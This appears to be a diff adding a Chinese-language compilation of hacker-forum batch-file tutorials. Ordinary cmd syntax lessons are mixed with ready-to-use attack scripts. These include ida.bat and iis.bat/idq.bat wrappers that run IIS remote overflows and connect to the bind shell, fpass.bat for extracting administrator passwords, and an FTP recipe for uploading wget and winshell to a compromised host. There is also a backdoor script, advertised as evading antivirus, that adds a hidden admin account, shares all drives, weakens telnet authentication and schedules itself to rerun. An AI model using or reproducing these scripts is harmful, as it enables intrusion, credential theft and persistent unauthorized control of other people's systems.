@@ -1,0 +1,764 @@
+Cmd
+
+批处理BAT加强说明
+信息来源：刀光血影论坛（榕哥的论坛）
+文章结构 
+1. 所有内置命令的帮助信息 
+2. 环境变量的概念 
+3. 内置的特殊符号(实际使用中间注意避开) 
+4. 简单批处理文件概念 
+5. 附件1 tmp.txt 
+6. 附件2 sample.bat 
+
+###################################################################### 
+1. 所有内置命令的帮助信息 
+###################################################################### 
+ver 
+cmd /? 
+set /? 
+rem /? 
+if /? 
+echo /? 
+goto /? 
+for /? 
+shift /? 
+call /? 
+其他需要的常用命令 
+type /? 
+find /? 
+findstr /? 
+copy /? 
+______________________________________________________________________ 
+下面将所有上面的帮助输出到一个文件 
+echo ver >tmp.txt 
+ver >>tmp.txt 
+echo cmd /? >>tmp.txt 
+cmd /? >>tmp.txt 
+echo rem /? >>tmp.txt 
+rem /? >>tmp.txt 
+echo if /? >>tmp.txt 
+if /? >>tmp.txt 
+echo goto /? >>tmp.txt 
+goto /? >>tmp.txt 
+echo for /? >>tmp.txt 
+for /? >>tmp.txt 
+echo shift /? >>tmp.txt 
+shift /? >>tmp.txt 
+echo call /? >>tmp.txt 
+call /? >>tmp.txt 
+echo type /? >>tmp.txt 
+type /? >>tmp.txt 
+echo find /? >>tmp.txt 
+find /? >>tmp.txt 
+echo findstr /? >>tmp.txt 
+findstr /? >>tmp.txt 
+echo copy /? >>tmp.txt 
+copy /? >>tmp.txt 
+type tmp.txt 
+______________________________________________________ 
+
+###################################################################### 
+2. 环境变量的概念 
+###################################################################### 
+_____________________________________________________________________________ 
+C:\Program Files>set 
+ALLUSERSPROFILE=C:\Documents and Settings\All Users 
+CommonProgramFiles=C:\Program Files\Common Files 
+COMPUTERNAME=FIRST 
+ComSpec=C:\WINNT\system32\cmd.exe 
+NUMBER_OF_PROCESSORS=1 
+OS=Windows_NT 
+Os2LibPath=C:\WINNT\system32\os2\dll; 
+Path=C:\WINNT\system32;C:\WINNT;C:\WINNT\system32\WBEM 
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH 
+PROCESSOR_ARCHITECTURE=x86 
+PROCESSOR_IDENTIFIER=x86 Family 6 Model 6 Stepping 5, GenuineIntel 
+PROCESSOR_LEVEL=6 
+PROCESSOR_REVISION=0605 
+ProgramFiles=C:\Program Files 
+PROMPT=$P$G 
+SystemDrive=C: 
+SystemRoot=C:\WINNT 
+TEMP=C:\WINNT\TEMP 
+TMP=C:\WINNT\TEMP 
+USERPROFILE=C:\Documents and Settings\Default User 
+windir=C:\WINNT 
+_____________________________________________________________________________ 
+
+path: 表示可执行程序的搜索路径. 我的建议是你把你的程序copy 到 
+%windir%\system32\. 这个目录里面. 一般就可以自动搜索到. 
+语法: copy mychenxu.exe %windir%\system32\. 
+使用点(.) 便于一目了然 
+对环境变量的引用使用(英文模式,半角)双引号 
+%windir% 变量 
+%%windir%% 二次变量引用. 
+我们常用的还有 
+%temp% 临时文件目录 
+%windir% 系统目录 
+%errorlevel% 退出代码 
+
+输出文件到临时文件目录里面.这样便于当前目录整洁. 
+
+对有空格的参数. 你应该学会使用双引号("") 来表示比如对porgram file文件夹操作 
+C:\>dir p* 
+C:\ 的目录 
+2000-09-02 11:47 2,164 PDOS.DEF 
+1999-01-03 00:47 <DIR> Program Files 
+1 个文件 2,164 字节 
+1 个目录 1,505,997,824 可用字节 
+
+C:\>cd pro* 
+C:\Program Files> 
+
+C:\> 
+C:\>cd "Program Files" 
+C:\Program Files> 
+
+
+###################################################################### 
+3. 内置的特殊符号(实际使用中间注意避开) 
+###################################################################### 
+微软里面内置了下列字符不能够在创建的文件名中间使用 
+con nul aux \ / │ ││ && ^ > < * 
+
+You can use most characters as variable values, including white space. If you use the special characters <, >, │, &, or ^, you must precede them with the escape character (^) or quotation marks. If you use quotation marks, they are included as part of the value because everything following the equal sign is taken as the value. Consider the following examples: 
+(大意: 要么你使用^作为前导字符表示.或者就只有使用双引号""了) 
+To create the variable value new&name, type: 
+set varname=new^&name 
+
+To create the variable value "new&name", type: 
+set varname="new&name" 
+
+The ampersand (&), pipe (│), and parentheses ( ) are special characters that must be preceded by the escape character (^) or quotation marks when you pass them as arguments. 
+
+find "Pacific Rim" < trade.txt > nwtrade.txt 
+IF EXIST filename. (del filename.) ELSE echo filename. missing 
+
+> 创建一个文件 
+>> 追加到一个文件后面 
+@ 前缀字符.表示执行时本行在cmd里面不显示, 可以使用 echo off关闭显示 
+^ 对特殊符号( > < &)的前导字符. 第一个只是显示aaa 第二个输出文件bbb 
+echo 123456 ^> aaa 
+echo 1231231 > bbb 
+() 包含命令 
+(echo aa & echo bb) 
+, 和空格一样的缺省分隔符号. 
+; 注释,表示后面为注释 
+: 标号作用 
+│ 管道操作 
+& Usage：第一条命令 & 第二条命令 [& 第三条命令...] 
+用这种方法可以同时执行多条命令，而不管命令是否执行成功 
+dir c:\*.exe & dir d:\*.exe & dir e:\*.exe 
+&& Usage：第一条命令 && 第二条命令 [&& 第三条命令...] 
+当碰到执行出错的命令后将不执行后面的命令，如果一直没有出错则一直执行完所有命令； 
+││ Usage：第一条命令 ││ 第二条命令 [││ 第三条命令...] 
+当碰到执行正确的命令后将不执行后面的命令，如果没有出现正确的命令则一直执行完所有命令； 
+
+常用语法格式 
+IF [NOT] ERRORLEVEL number command para1 para2 
+IF [NOT] string1==string2 command para1 para2 
+IF [NOT] EXIST filename command para1 para2 
+
+IF EXIST filename command para1 para2 
+IF NOT EXIST filename command para1 para2 
+IF "%1"=="" goto END 
+IF "%1"=="net" goto NET 
+IF NOT "%2"=="net" goto OTHER 
+IF ERRORLEVEL 1 command para1 para2 
+IF NOT ERRORLEVEL 1 command para1 para2 
+FOR /L %%i IN (start,step,end) DO command [command-parameters] %%i 
+FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do echo %i %j %k 
+按照字母顺序 ijklmnopq依次取参数. 
+eol=c - 指一个行注释字符的结尾(就一个) 
+skip=n - 指在文件开始时忽略的行数。 
+delims=xxx - 指分隔符集。这个替换了空格和跳格键的默认分隔符集。 
+
+
+###################################################################### 
+4. 简单批处理文件概念 
+###################################################################### 
+
+echo This is test > a.txt 
+type a.txt 
+echo This is test 11111 >> a.txt 
+type a.txt 
+echo This is test 22222 > a.txt 
+type a.txt 
+第二个echo是追加 
+第三个echo将清空a.txt 重新创建 a.txt 
+
+netstat -n │ find "3389" 
+这个将要列出所有连接3389的用户的ip. 
+
+________________test.bat___________________________________________________ 
+@echo please care 
+echo plese care 1111 
+echo plese care 2222 
+echo plese care 3333 
+@echo please care 
+@echo plese care 1111 
+@echo plese care 2222 
+@echo plese care 3333 
+rem 不显示注释语句,本行显示 
+@rem 不显示注释语句,本行不显示 
+@if exist %windir%\system32\find.exe (echo Find find.exe !!!) else (echo ERROR: Not find find.exe) 
+@if exist %windir%\system32\fina.exe (echo Find fina.exe !!!) else (echo ERROR: Not find fina.exe) 
+___________________________________________________________________________ 
+
+下面我们以具体的一个idahack程序就是ida远程溢出为例子.应该是很简单的. 
+
+___________________ida.bat_________________________________________________ 
+@rem ver 1.0 
+@if NOT exist %windir%\system32\idahack.exe echo "ERROR: dont find idahack.exe" 
+@if NOT exist %windir%\system32\nc.exe echo "ERROR: dont find nc.exe" 
+
+@if "%1" =="" goto USAGE 
+@if NOT "%2" =="" goto SP2 
+
+tart 
+@echo Now start ... 
+@ping %1 
+@echo chinese win2k:1 sp1:2 sp2:3 
+idahack.exe %1 80 1 99 >%temp%\_tmp 
+@echo "prog exit code [%errorlevel%] idahack.exe" 
+@type %temp%\_tmp 
+@find "good luck" %temp%\_tmp 
+@echo "prog exit code [%errorlevel%] find [goog luck]" 
+@if NOT errorlevel 1 nc.exe %1 99 
+@goto END 
+
+P2 
+@idahack.exe %1 80 %2 99 %temp%\_tmp 
+@type %temp%\_tmp 
+@find "good luck" %temp%\_tmp 
+@if NOT errorlevel 1 nc.exe %1 99 
+@goto END 
+
+:USAGE 
+@echo Example: ida.bat IP 
+@echo Example: ida.bat IP (2,3) 
+
+:END 
+_____________________ida.bat__END_________________________________ 
+
+下面我们再来第二个文件.就是得到administrator的口令. 
+大多数人说得不到.其实是自己的没有输入正确的信息. 
+
+___________________________fpass.bat____________________________________________ 
+@rem ver 1.0 
+@if NOT exist %windir%\system32\findpass.exe echo "ERROR: dont find findpass.exe" 
+@if NOT exist %windir%\system32\pulist.exe echo "ERROR: dont find pulist.exe" 
+
+@echo start.... 
+@echo ____________________________________ 
+@if "%1"=="" goto USAGE 
+@findpass.exe %1 %2 %3 >> %temp%\_findpass.txt 
+@echo "prog exit code [%errorlevel%] findpass.exe" 
+@type %temp%\_findpass.txt 
+@echo ________________________________Here__pass★★★★★★★★ 
+@ipconfig /all >>%temp%\_findpass.txt 
+@goto END 
+
+:USAGE 
+@pulist.exe >%temp%\_pass.txt 
+@findstr.exe /i "WINLOGON explorer internat" %temp%\_pass.txt 
+@echo "Example: fpass.bat %1 %2 %3 %4 !!!" 
+@echo "Usage: findpass.exe DomainName UserName PID-of-WinLogon" 
+
+:END 
+@echo " fpass.bat %COMPUTERNAME% %USERNAME% administrator " 
+@echo " fpass.bat end [%errorlevel%] !" 
+_________________fpass.bat___END___________________________________________________________ 
+
+还有一个就是已经通过telnet登陆了一个远程主机.怎样上传文件(win) 
+依次在窗口输入下面的东西. 当然了也可以全部拷贝.Ctrl+V过去. 然后就等待吧!! 
+
+echo open 210.64.x.4 3396>w 
+echo read>>w 
+echo read>>w 
+echo cd winnt>>w 
+echo binary>>w 
+echo pwd >>w 
+echo get wget.exe >>w 
+echo get winshell.exe >>w 
+echo get any.exe >>w 
+echo quit >>w 
+ftp -s:w
+
+
+
+
+用批处理写的后门 永不被杀 (加威)
+@echo off 
+@attrib +s + r hoby.bat
+@net user hoby 12345 /add 
+@net localgroup administrators hoby /add 
+@net share c$=c: 
+@net share d$=d:
+@net share e$=e:
+@net share f$=f:
+@net share g$=g:
+@net share h$=h:
+@tlntadmn config sec = -ntlm
+
+@net stop schedule
+@net start Schedule
+@echo at 11:00 c:\WINNT\SYSTEM32\log.bat > c:\WINNT\SYSTEM32\hoby.bat 
+@echo at 23:00 c:\WINNT\SYSTEM32\log.bat >> c:\WINNT\SYSTEM32\hoby.bat 
+@at 11:05 c:\WINNT\SYSTEM32\hoby.bat 
+@at 23:05 c:\WINNT\SYSTEM32\hoby.bat 
+@net stop telnet 
+@net start telnet 
+@exit 
+
+这样就会循环运行我们的程序了，即使被人停下来，过几个小时，又回重新运行，呵呵~~
+运行后TELNET IP上去，用户名为hoby，密码为12345
+
+
+精通批处理
+小引：
+最近好多猜测弱口令的病毒在网上流行，比如前段时间闹得很厉害的Worm.Dvldr 蠕虫就是一个典型。这些病毒有个共同点就是利用批处理来进行ipc$连接，从而来猜测管理员的口令达到控制服务器的目的。病毒由几个文件和几个复杂的批处理组成。批处理算不上真正意义上的编程，但是它的一些思想和编程比较近似。通过在网上和一些初学的朋友交流，发现他们对于批处理很感兴趣，多多少少了解一些命令的用法，但缺乏比较系统的了解，所以特意写下这篇教程，好让感兴趣的朋友对批处理有个整体的认识，并能通过该教程举一反三，写出自己的批处理。
+该教程一共分为4大部分，第一部分是批处理的专用命令，第二部分是特殊的符号与批处理，第三部分是批处理与变量，第四部分是完整案例。因为教程比较长，所有在杂志上我们将分为两次连载，本期首先刊登一、二两部分，敬请读者注意。
+
+第一部分：批处理的专用命令
+
+批处理文件是将一系列命令按一定的顺序集合为一个可执行的文本文件，其扩展名为BAT。这些命令统称批处理命令，下面我就来给大家介绍一下批处理的命令。
+1、     REM
+REM 是个注释命令一般是用来给程序加上注解的，该命令后的内容在程序执行的时候将不会被显示和执行。例：
+REM 你现在看到的就是注解，这一句将不会被执行。在以后的例子中解释的内容都REM 会放在REM后面。请大家注意。
+
+2、     ECHO
+ECHO 是一个回显命令主要参数有OFF和 ON,一般用ECHO message来显示一个特定的消息 。例：
+Echo off
+Rem 以上代表关闭回显即不显示所执行的命令
+Echo 这个就是消息。
+Rem 以上代表显示“这就是消息”这列字符
+执行结果：
+C:\>ECHO.BAT
+这个就是消息。
+
+3、     GOTO
+GOTO 即为跳转的意思。在批处理中允许以“：XXX”来构建一个标号然后用GOTO ：标号直接来执行标号后的命令。例
+:LABEL
+REM 上面就是名为LABEL的标号。
+DIR C:\
+DIR D:\
+GOTO LABEL
+REM 以上程序跳转标号LABEL处继续执行。
+
+4、CALL
+CALL 命令可以在批处理执行过程中调用另一个批处理，当另一个批处理执行完后再继续执行原来的批处理。例：
+批处理2.BAT内容如下：
+ECHO 这就是2的内容
+批处理1.BAT内容如下：
+ECHO 这是1的内容
+CALL 2.BAT
+ECHO 1和2的内容全部显示完成
+执行结果如下：
+      C:\>1.BAT
+      这是1的内容
+  这就是2的内容
+      1和2的内容全部显示完成
+
+5、PAUSE
+PAUSE 停止系统命令的执行并显示下面的内容。例：
+C:\> PAUSE
+请按任意键继续 . . .
+
+6、     IF
+IF 条件判断语句，语法格式如下：
+IF [NOT] ERRORLEVEL number command
+IF [NOT] string1==string2 command
+IF [NOT] EXIST filename command
+说明：
+[NOT] 将返回的结果取反值即“如果没有”的意思。
+ERRORLEVEL 是命令执行完成后返回的退出值
+Number 退出值的数字取值范围0~255。判断时值的排列顺序应该又大到小。返回的值大于或等于指定的值时条件成立。
+string1==string2 string1和string2都为字符的数据，英文字符的大小写将看做不同，这个条件中的等于号必须是2个（绝对相等），条件想等后即执行后面的 command
+EXIST filename 为文件或目录存在的意思。
+IF ERRORLEVEL这条语句必须放在某一个命令后面。执行命令后由IF ERRORLEVEL来判断命令的返回值。
+例：
+1、     IF [NOT] ERRORLEVEL number command
+检测命令执行完后的返回值做出判断。
+echo off
+dir z:
+rem 如果退出代码为1（不成功）就跳至标题1处执行
+IF ERRORLEVEL 1 goto 1
+rem 如果退出代码为0（成功）就跳至标题0处执行
+IF ERRORLEVEL 0 goto 0
+:0
+echo 命令执行成功！ 
+Rem 程序执行完毕跳至标题exit处退出
+goto exit
+:1
+echo 命令执行失败！
+Rem 程序执行完毕跳至标题exit处退出
+goto exit
+:exit
+Rem 这里是程序的出口
+2、     IF string1==string2 command
+检测当前变量的值做出判断
+ECHO OFF
+IF %1==2 goto no
+Echo 变量相等！
+Goto exit
+:no
+echo 变量不相等
+goto exit
+:exit
+大家可以这样看效果 C:\>test.bat 数字
+
+3、     IF [NOT] EXIST filename command
+发现特定的文件做出判断
+echo off
+IF not EXIST autoexec.bat goto 1
+echo 文件存在成功！ 
+goto exit
+:1
+echo 文件不存在失败！
+goto exit
+:exit
+这个批处理大家可以放在c盘和d盘分别执行看看效果。
+7、     FOR
+FOR这个命令比较特殊是一个循环执行命令的命令，同时FOR的循环里面还可以套用FOR在进行循环。这篇我们介绍基本的用法就不做套用的循环了，后面再来讲解套用的循环。在批处理中FOR的命令如下：
+FOR [%%c] IN (set) DO [command] [arguments]
+在命令行中命令如下：
+FOR [%c] IN (set) DO [command] [arguments]
+常用参数：
+/L 该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生序列 (5 4 3 2 1)。
+/D 如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。
+
+/F 从指定的文件中读取数据作为变量
+eol=c       - 指一个行注释字符的结尾(就一个)
+skip=n       - 指在文件开始时忽略的行数。
+delims=xxx     - 指分隔符集。这个替换了空格和跳格键的默认分隔符集。
+tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代的 for 本身。这会导致额外变量名称的分配。m-n格式为一个范围。通过 nth 符号指定 mth。如果符号字符串中的最后一个字符星号，那么额外的变量将在最后一个符号解析之后分配并接受行的保留文本。
+usebackq     - 指定新语法已在下类情况中使用:在作为命令执行一个后引号的字符串并且一个单引号字符为文字字符串命令并允许在 filenameset中使用双引号扩起文件名称。
+下面来看一个例子：
+FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do @echo %i %j %k
+会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或空格定界符号。请注意，这个 for 程序体的语句引用 %i 来取得第二个符号，引用 %j 来取得第三个符号，引用 %k来取得第三个符号后的所有剩余符号。对于带有空格的文件名，您需要用双引号将文件名括起来。为了用这种方式来使用双引号，您还需要使用 usebackq 选项，否则，双引号会被理解成是用作定义某个要分析的字符串的。
+%i 专门在 for 语句中得到说明，%j 和 %k 是通过tokens= 选项专门得到说明的。您可以通过 tokens= 一行指定最多 26 个符号，只要不试图说明一个高于字母 'z' 或'Z' 的变量。请记住，FOR 变量名分大小写，是通用的；而且，同时不能有 52 个以上都在使用中。
+您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，用单引号将括号之间的 filenameset 括起来。这样，该字符串会被当作一个文件中的一个单一输入行。最后，您可以用 FOR /F 命令来分析命令的输出。方法是，将括号之间的 filenameset 变成一个反括字符串。该字符串会被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进内存，并被当作文件分析。因此，以下例子:
+FOR /F "usebackq delims==" %i IN (`set`) DO @echo %i
+会枚举当前环境中的环境变量名称。
+以下列举一个简单的例子，他将说明参数/L和没有参数的区别：
+删除文件1.TXT 2.TXT 3.TXT 4.TXT 5.TXT
+例：
+ECHO OFF
+FOR /L %%F IN (1,1,5) DO DEL %%F.TXT
+或
+FOR %%F IN (1,2,3,4,5) DO DEL %%F.TXT
+以上2条命令执行的结果都是一样的如下：
+C:\>DEL 1.TXT
+C:\>DEL 2.TXT
+C:\>DEL 3.TXT
+C:\>DEL 4.TXT
+C:\>DEL 5.TXT
+
+8、     SETLOCAL
+开始批处理文件中环境改动的本地化操作。在执行 SETLOCAL 之后
+所做的环境改动只限于批处理文件。要还原原先的设置，必须执
+行 ENDLOCAL。 达到批处理文件结尾时，对于该批处理文件的每个
+尚未执行的 SETLOCAL 命令，都会有一个隐含的 ENDLOCAL 被
+执行。例：
+@ECHO OFF
+SET PATH       /*察看环境变量PATH
+PAUSE
+SETLOCAL
+SET PATH=E:\TOOLS   /*重新设置环境变量PATH
+SET PATH
+PAUSE
+ENDLOCAL
+SET PATH
+从上例我们可以看到环境变量PATH第1次被显示得时候是系统默认路径。被设置成了E:\TOOLS后显示为E:\TOOLS但当ENDLOCAL后我们可以看到他又被还原成了系统的默认路径。但这个设置只在该批处理运行的时候有作用。当批处理运行完成后环境变量PATH将会还原。
+
+9、     SHIFT
+SHIFT命令可以让在命令上的的命令使用超过10个（%0~%9）以上的可替代参数例：
+ECHO OFF
+ECHO %1 %2 %3 %4 %5 %6 %7 %8 %9
+SHIFT
+ECHO %1 %2 %3 %4 %5 %6 %7 %8 %9
+SHIFT
+ECHO %1 %2 %3 %4 %5 %6 %7 %8 %9
+执行结果如下：
+C::\>SHIFT.BAT 1 2 3 4 5 6 7 8 9 10 11
+1 2 3 4 5 6 7 8 9
+2 3 4 5 6 7 8 9 10
+3 4 5 6 7 8 9 10 11
+以上就是基于WIN2000下的9个批处理命令。
+
+第二部分：特殊的符号与批处理
+
+在命令行下有些符号是不允许使用的但有些符号却有着特殊的意义。
+1、     符号(@)
+@在批处理中的意思是关闭当前行的回显。我们从上面知道用命令echo off可以关掉整个批处理的命令回显但却不能不显示echo off这个命令。现在我们在这个命令前加上@这样echo off这一命令就被@关闭了回显从而达到所有命令均不回显得要求
+2、     符号(>)
+>的意思是传递并覆盖。他所起的作用是将运行后的回显结果传递到后面的范围（后面可是文件也可是默认的系统控制台）例：
+文件1.txt的文件内容为：
+1+1
+使用命令c:\>dir *.txt >1.txt
+这时候1.txt的内容如下
+驱动器 C 中的卷没有标签。
+卷的序列号是 301A-1508
+C:\ 的目录
+2003-03-11 14:04           1,005 FRUNLOG.TXT
+2003-04-04 16:38       18,598,494 log.txt
+2003-04-04 17:02             5 1.txt
+2003-03-12 11:43             0 aierrorlog.txt
+2003-03-30 00:35           30,571 202.108.txt
+          5 个文件   18,630,070 字节
+          0 个目录 1,191,542,784 可用字节 
+>将命令执行的结果覆盖了原始的文件内容。
+在传递给控制台的时候程序将不会有任何回显（注意：这里的回显跟echo off关掉的回显不是同一概念。Echo off关掉的是输入命令的回显，这里的回显是程序执行中或后的回显）例：
+C:\>dir *.txt >nul 
+程序将没有任何显示也不会产生任何痕迹。
+3、     符号(>>)
+符号>>的作用与符号>相似，但他们的区别在于>>是传递并在文件末尾追加>>也可将回显传递给控制台（用法同上）例：
+文件1.txt内同为：
+1+1
+使用命令c:\>dir *.txt >>1.txt
+这时候1.txt的内容如下
+1+1
+驱动器 C 中的卷没有标签。
+卷的序列号是 301A-1508
+C:\ 的目录
+2003-03-11 14:04           1,005 FRUNLOG.TXT
+2003-04-04 16:38       18,598,494 log.txt
+2003-04-04 17:02             5 1.txt
+2003-03-12 11:43             0 aierrorlog.txt
+2003-03-30 00:35           30,571 202.108.txt
+          5 个文件   18,630,070 字节
+          0 个目录 1,191,542,784 可用字节 
+>>将命令执行的结果覆加在了原始的文件内容后面。
+4、     符号(|)
+|是一个管道传输命令意思是将上一命令执行的结果传递给下一命令去处理。例：
+C:\>dir c:\|find "1508"
+卷的序列号是 301A-1508
+以上命令的意思为查找c:\的所有并发现1508字符串。Find的用法请用 find /?自行查看
+在不使用format的自动格式化参数的时候我是这样来自动格式化盘片的
+echo y|fornat a: /s /q /v:system
+用过format命令的人都知道format有一个交互对化过程，要使用者输入y来确定当前的命令是否被执行。在这个命令前加上echo y并用管道传输符|将echo执行的结果y传递给format从而达到手工输入y的目的（这条命令有危害性，测试的时候请谨慎）
+5、     符号(^)
+^ 是对特殊符号 > 、<、 &、的前导字符。在命令中他将以上的3个符号的特殊动能去掉仅仅只吧他们当成符号而不使用他们的特殊意义。例：
+c:\>echo test ^> 1.txt
+test > 1.txt
+从上面可以看出并没有把test写入文件1.txt而是将test >1.txt 当字符串显示了出来。这个符号在远程构建批处理的时候很有效果。 
+6、     符号(&)
+&符号允许在一行中使用2个以上不同的命令，当第一个命令执行失败将不影响第2个命令的执行。例：
+c:\> dir z:\ &dir y:\ &dir c:\
+以上的命令将会连续显示z: y: c:盘内的内容不理会该盘符是否存在。
+7、     符号(&&)
+&&符号也是允许在一行中使用2个以上不同的命令，当第一个命令执行失败后后续的命令将不会再被执行。例：
+c:\> dir z:\ &&dir y:\ &&dir c:\
+以上的命令将会提示检查是否存在z:盘如果存在则执行，如果不存在则停止执行所有的后续命令
+8、     符号(" ")
+" "符号允许在字符串中包含空格。进入一个特殊的目录可以用如下方法例:
+c:\>cd “Program Files”
+c:\>cd progra~1
+c:\>cd pro*
+以上方法都可以进入Program Files目录
+9、     符号（,）
+,符号相当于空格。在某些特殊的情况下可以用,来代替空格使用。例：
+c:\>dir,c:\
+10、     符号(;)
+;符号当命令相同的时候可以将不同的目标用;隔离开来但执行效果不变。如执行过程中发生错误则只返回错误报告但程序还是会继续执行。例：
+DIR C:\;D:\;E:\F:\
+以上的命令相当于
+DIR C:\
+DIR D:\
+DIR E:\
+DIR F:\
+当然还有些特殊的符号但他们的使用范围很小我就不再这里一一的说明了。
+
+第三部分：批处理与变量
+
+在批处理中适当的引用变量将会使你所编制的程序应用面更广。批处理每次能处理的变量从%0~%9共10个。其中%0默认给批处理的文件名使用。除非在使用SHIFT命令后%0才能被%1所替代。引用shift命令的例子如果把%1前面多加上一个%0那么结果如下：
+C::\>SHIFT.BAT 1 2 3 4 5 6 7 8 9 10 11
+SHIFT.BAT 1 2 3 4 5 6 7 8 9
+1 2 3 4 5 6 7 8 9 10
+2 3 4 5 6 7 8 9 10 11
+系统是如何区分每个变量的呢，系统区分变量的规则为字符串中间的空格，即只要发现空格就把空格前面的字符当作一个变量而空格后面的字符则作为另一个变量。如果你的变量是一个当中包含空格的长目录名这时候你需要用上一节特殊符号8中所用的引号将他圈起来。例：
+批处理内容为：
+ECHO %1 
+ECHO %2 
+ECHO %3
+输入命令：
+C:\>TEST “Program Files” Program Files
+Program Files
+Program 
+Files
+在一个复杂的批处理中又可能同时使用的变量会超过10个这时候会和系统的规则想冲突那么这个问题怎么解决呢？在系统中还有一种变量称之为环境变量（使用SET命令可以查看当前系统的环境变量）如当前系统目录是%windir%或%SystemRoot%等。当同时使用的参数超过10个的时候，我们可以把某些在后面的程序中还要调用的变量保存为环境变量。具体用法如 SET A=%1 这样我们就命名了一个新的环境变量A 在调用变量A的时候要%A%这样调用，环境变量不受SHIFT命令影响。如果要改变一个环境变量需要重新对其设置才能改变。当然也可以进行变量与变量之间的传递来达到目的。下面我们来看一个例子，批处理如下：
+ECHO OFF
+SET PASS=%1
+SHIFT
+SET PASS1=%1
+SHIFT
+ECHO %PASS% %PASS1% %1 %2 %3 %4 %5 %6 %7 %8 %9 
+SHIFT
+ECHO %PASS% %PASS1% %9
+SET PASS=%PASS1%       变量的传递
+SET PASS1=%9
+SHIFT
+ECHO %PASS% %PASS1% %9
+使用命令：C:\>TEST A B 3 4 5 6 7 8 9 10 K L
+A B 3 4 5 6 7 8 9 10 K 注意：这一行显示了11个变量
+A B L           在使用了3次SHIFT之后%9变成了L
+B L             变量的传递后的结果
+
+
+第四部分：完整案例
+
+以上就是批处理的一些用法。现在我们把这些用法结合起来详细的分析一下目前网上发布的一些批处理，看看他们是怎么运作的。这里我将列举三个例子来详细分析，为了保持程序的完整我的注释会加在/*后面。
+例一
+这个例子是利用iis5hack.exe对有.printer漏洞的主机进行溢出的批处理。用到的程序有iis5hack.exe和系统自带的telnet.exe。iis5hack的命令格式为：
+iis5hack <目标ip> <目标端口> <目标版本> <溢出连接端口>目标版本为0-9这10个数字分别对应不同语言版本和sp的系统版本，我们编制的批处理使用的命令格式为 <iis.bat 目标ip （开始版本号）>开始版本号可有可无。程序如下。
+@echo off                   /*关闭命令回显
+if "%1%"=="" goto help           /*判断%1是否为空，%1为目标ip
+if "%2%"=="1" goto 1             /*判断%2是否为1，为1则跳转标志1
+if "%2%"=="2" goto 2             /*%2为开始版本号，如果没有设置则
+if "%2%"=="3" goto 3             /*如果存在则从匹配的地方开始执行
+if "%2%"=="4" goto 4
+if "%2%"=="5" goto 5
+if "%2%"=="6" goto 6
+if "%2%"=="7" goto 7
+if "%2%"=="8" goto 8
+if not EXIST iis5hack.exe goto file /*没有发现iis5hack.exe就执行标志file段内容
+ping %1 -n 1 | find "Received = 1" /*ping目标1次，从结果中发现Received = 1
+if errorlevel 1 goto error       /*如果返回代码为1则执行error段(代码1为没有发现 0为发现并成功执行)
+iis5hack %1 80 9 88 | find "good" /*开始溢出目标端口80 系统代码9 溢出后连接端口88 在执行结果中发现字符串”good”(溢出成功后才会有字符串good)
+if not errorlevel 1 goto telnet     /*如果没有错误代码1（溢出成功）就执行telnet段的内容。
+echo 操作系统类型 9 失败!   /否则显示这一句
+:8                   /*以下代码内容参照上面
+iis5hack %1 80 8 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 8 失败!
+:7
+iis5hack %1 80 7 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 7 失败!
+:6
+iis5hack %1 80 6 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 6 失败!
+:5
+iis5hack %1 80 5 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 5 失败!
+:4
+iis5hack %1 80 4 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 4 失败!
+:3
+iis5hack %1 80 3 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 3 失败!
+:2
+iis5hack %1 80 2 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 2 失败!
+:1
+iis5hack %1 80 1 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 1 失败!
+:0
+iis5hack %1 80 0 88 | find "good"
+if not errorlevel 1 goto telnet
+echo 操作系统类型 0 失败!
+goto error
+:telnet
+telnet %1 88               /*开始连接目标ip的88端口
+goto exit                 /*连接中断后跳转exit段
+:error                 /*error段显示错误后的帮助信息
+echo 可能网络不能连接或者对方以修补该漏洞!请按照下面的格式手工尝试一次!
+echo iis5hack [目标IP] [WEB端口] [系统类型] [开放端口]
+ECHO 中文:         0
+ECHO 中文+sp1:     1
+ECHO 英文:         2
+ECHO 英文+sp1:     3
+ECHO 日语:         4
+ECHO 日语+sp1:     5
+ECHO 韩文:         6
+ECHO 韩文+sp1:     7
+ECHO 墨西哥语:     8
+ECHO 墨西哥语+sp1:   9
+goto exit       /*跳转exit段
+:file           /*file段显示文件没有发现的信息
+echo 文件iis5hack.exe没有发现!程序终止运行!
+goto exit       /*跳转exit段
+:help         /*help段显示本批处理的使用格式帮助
+echo 本程序用法如下:
+echo iis [目标ip]
+echo iis [目标ip] [开始的号码9-0]
+:exit           /*exit段为程序出口
+这个批处理基本没有什么循环只是一路走下来。所以代码比较长难度不大！
+例二
+这个例子是用iisidq.exe对有idq漏洞的机器进行溢出的批处理。使用的程序有iisidq.exe和系统自带的程序telnet.exe。iisidq.exe的用法如下：
+运行参数: 操作系统类型 目的地址 web端口 1 溢出监听端口 <输入命令1>
+  其中,如果输入命令参数没有输入,那么,默认为:"cmd.exe"。
+其中操作系统类型类型的代码范围是0-14。我们编制的批处理使用的命令格式为 <idq.bat 目标ip>程序如下：
+@echo off               /*同例一
+if not EXIST iisidq.exe goto file   /*同例一
+if %1 == "" goto error         /*同例一
+ping %1 -n 1 | find "Received = 1"   /*同例一
+if errorlevel 1 goto error1       /*同例一
+set b=%1       /*创建一个环境变量b,将变量%1的内容传递给环境变量b。变量b的内容以后将是目标ip
+set a=0         /*创建一个环境变量a并指定环境变量a为0。由于使用整个批处理的循环所以用a来做计数器。
+:no           /*no段开始
